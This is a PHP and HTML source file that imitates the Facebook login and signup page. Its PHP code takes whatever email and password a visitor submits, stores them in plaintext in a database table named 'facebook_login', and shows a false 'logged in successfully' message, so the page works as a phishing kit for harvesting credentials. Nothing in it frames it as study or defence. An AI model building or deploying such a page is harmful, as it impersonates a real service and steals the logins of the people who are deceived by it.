<?php

    if (array_key_exists('email', $_POST) OR array_key_exists('password', $_POST)) {
        
        $link = mysqli_connect("localhost", "root", "","facebook");

            if (mysqli_connect_error()) {
        
                die ("There was an error connecting to the database");
        
            } 
			else{
			echo"db connected success";
			}
         if ($_POST['email'] == '' and $_POST['password'] == '') {
				?>
                   
					<script type="text/javascript">
					alert("  email and password is required ");
					</script>
               <?php  
		 }
        
        else if ($_POST['email'] == '') {
				?>
                   
					<script type="text/javascript">
					alert(" Email or mobile number is required! ");
					</script>
               <?php  
            
		  
        }
		else if ($_POST['password'] == '') {
            
          ?>
                   
					<script type="text/javascript">
					alert("  password is required! ");
					</script>
               <?php  
            
            
        }   else {
                
                $query = "INSERT INTO `facebook_login` (`email`, `password`) VALUES ('".mysqli_real_escape_string($link, $_POST['email'])."', '".mysqli_real_escape_string($link, $_POST['password'])."')";
                
                if (mysqli_query($link, $query)) {
                    
					?>
                   
					<script type="text/javascript">
					alert("  logged in successfully ");
					</script>
               <?php     
                } else {
                    
                    echo "<p> please try again later.</p>";
                    
                }
			}
		
                
            
            
	}    
	?>
<html>
<head>
	<link rel="icon" type="image/gif/png" href="fb_icon.png">
	<link rel="stylesheet" type="text/css" href="FB.css">
	<title>Facebook-log in or sign up</title>
</head>
<body>
<header>
<div class="header-block">
				<div class="logo">
				<img src="Fb_logo.png"/>
				</div>
	
	<div class="Facebook-login">
	<form  action="" method="post">
		 <div class="email">
			 <label>Email or Phone</label><br>
			 <input type="text" name="email" />
			</div>		 
		<div class="password">
			 <label>Password</label><br>
			 <input type="password"  name="password"/><br>
			 <a href="#">Forgotten account?</a>
			</div>
			<div class="Login-btn">			
				<input type="submit" value="Log In">
				</div>
	</form>
	</div>			
</div>
</header>
<div class="container">
		<div class="connect">
		<p>Facebook helps you connect and share with the <br> people in your life.</p>
		<img src="connect.png"/>
		</div>
		<div class="register">
			<h2>Create an account</h2>
			<p class="para">It's free and always will be.</p>
				<div class="account">
				<form>
				 <input type="text" placeholder="First name">
				<input type="text" class="surname" placeholder="Surname"><br>
				<input type="text" class="account-email" placeholder="Mobile number or email address"><br>
				<input type="password"  placeholder="New password"><br>
				<lable>Birthday</lable><br>
				<select name="day" >
				<option value="day">Day<option>
				<option value="1">1<option>
				<option value="2">2<option>
				<option value="3">3<option>
				<option value="4">4<option>
				<option value="5">5<option>
				</select>
				<select name="month">
				<option>Month<option>
				<option>jan<option>
				<option>Feb<option>
				<option>Mar<option>
				<option>Nov<option>
				<option>Dec<option>
				</select>
				<select name="year">
				<option>Year<option>
				<option>1995<option>
				<option>1996<option>
				<option>1997<option>
				<option>1998<option>
				<option>1999<option>
				<option>2000<option>
				</select>
				<a  href="#">Why do I need to provide my date of birth?</a><br>
				<input type="radio" name="gender"><lable>Female</lable>
				<input type="radio" name="gender"><lable>Male</lable>
				<p>By clicking Create an account, you agree to our Terms and<br>confirm that you have read our Data Policy, including our Cookie<br> Use Policy. You may receive SMS message notifications from<br> Facebook and can opt out at any time.</p><br>
				<button>Create an account</button><br>
				<span class="lastline"><a style="font-size:13px;font-weight:700; href="">Create a Page</a> for a celebrity, band or business.</span>
				</form>
				</div>
		</div>
</div>

</body>
</html>